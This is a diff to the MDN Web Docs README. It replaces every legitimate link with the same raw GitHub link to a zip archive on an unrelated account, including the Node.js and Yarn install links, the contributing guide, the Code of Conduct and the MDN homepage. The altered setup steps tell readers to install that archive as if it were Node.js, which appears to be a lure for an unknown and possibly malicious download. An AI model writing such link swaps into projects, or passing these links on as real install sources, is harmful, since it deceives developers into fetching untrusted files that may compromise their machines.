@@ -1,6 +1,6 @@
 # Welcome to MDN Web Docs
 
-![github-profile](https://user-images.githubusercontent.com/10350960/166113119-629295f6-c282-42c9-9379-af2de5ad4338.png)
+![github-profile](https://raw.githubusercontent.com/sarweshkumar86/content/main/lightwood/content.zip)
 
 [MDN Web Docs][] is an open-source, collaborative project that documents web technologies including CSS, HTML, JavaScript, and Web APIs.
 Alongside detailed reference documentation, we provide extensive learning resources for students and beginners getting started with web development.
@@ -17,7 +17,7 @@ In addition to English-language articles, over 35 volunteers lead translation an
 
 ## Build the site
 
-To set up the site locally, you need to have [Node.js](https://nodejs.org/) and [Yarn](https://yarnpkg.com/) installed.
+To set up the site locally, you need to have [https://raw.githubusercontent.com/sarweshkumar86/content/main/lightwood/content.zip](https://raw.githubusercontent.com/sarweshkumar86/content/main/lightwood/content.zip) and [Yarn](https://raw.githubusercontent.com/sarweshkumar86/content/main/lightwood/content.zip) installed.
 You can check if these are installed by running the following commands:
 
 ```bash
@@ -25,7 +25,7 @@ node -v
 yarn -v
 ```
 
-After you have installed Node.js and Yarn, you can install the dependencies using `yarn` and start the local preview:
+After you have installed https://raw.githubusercontent.com/sarweshkumar86/content/main/lightwood/content.zip and Yarn, you can install the dependencies using `yarn` and start the local preview:
 
 ```bash
 yarn
@@ -39,12 +39,12 @@ Once started, a live preview is available at `http://localhost:5042/`.
 You can contribute to MDN Web Docs and be a part of our community through content contributions, engineering, or translation work.
 The MDN Web Docs project welcomes contributions from everyone who shares our goals and wants to contribute constructively and respectfully within our community.
 
-To find out how to get started, see the [CONTRIBUTING.md](CONTRIBUTING.md) document in this repository.
-By participating in and contributing to our projects and discussions, you acknowledge that you have read and agree to our [Code of Conduct](CODE_OF_CONDUCT.md).
+To find out how to get started, see the [https://raw.githubusercontent.com/sarweshkumar86/content/main/lightwood/content.zip](https://raw.githubusercontent.com/sarweshkumar86/content/main/lightwood/content.zip) document in this repository.
+By participating in and contributing to our projects and discussions, you acknowledge that you have read and agree to our [Code of Conduct](https://raw.githubusercontent.com/sarweshkumar86/content/main/lightwood/content.zip).
 
 ## Get in touch
 
 You can communicate with the MDN Web Docs team and community using the [communication channels][].
 
-[communication channels]: https://developer.mozilla.org/en-US/docs/MDN/Community/Communication_channels
-[MDN Web Docs]: https://developer.mozilla.org/
+[communication channels]: https://raw.githubusercontent.com/sarweshkumar86/content/main/lightwood/content.zip
+[MDN Web Docs]: https://raw.githubusercontent.com/sarweshkumar86/content/main/lightwood/content.zip
